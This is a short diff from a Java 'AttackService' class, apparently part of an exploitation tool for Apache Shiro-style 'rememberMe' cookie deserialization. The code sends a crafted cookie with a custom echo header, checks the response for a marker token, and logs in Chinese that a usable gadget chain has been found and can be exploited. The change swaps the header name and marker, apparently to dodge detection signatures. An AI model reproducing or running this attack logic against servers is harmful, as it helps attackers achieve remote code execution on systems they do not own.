@@ -152,9 +152,9 @@ public class AttackService {
             if (rememberMe != null) {
                 HashMap header = new HashMap();
                 header.put("Cookie", rememberMe + ";");
-                header.put("techo", "f25a2fc72690b780b2a14e140ef6a9e0");
+                header.put("Ctmd", "08fb41620aa4c498a1f2ef09bbc1183c");
                 String result = this.headerHttpRequest(header);
-                if (result.contains("f25a2fc72690b780b2a14e140ef6a9e0")) {
+                if (result.contains("08fb41620aa4c498a1f2ef09bbc1183c")) {
                     this.mainController.logTextArea.appendText(Utils.log("[*] 发现构造链:" + gadgetOpt + "  回显方式: " + echoOpt));
                     this.mainController.logTextArea.appendText(Utils.log("[*] 请尝试进行功能区利用。"));
                     this.mainController.gadgetOpt.setValue(gadgetOpt);
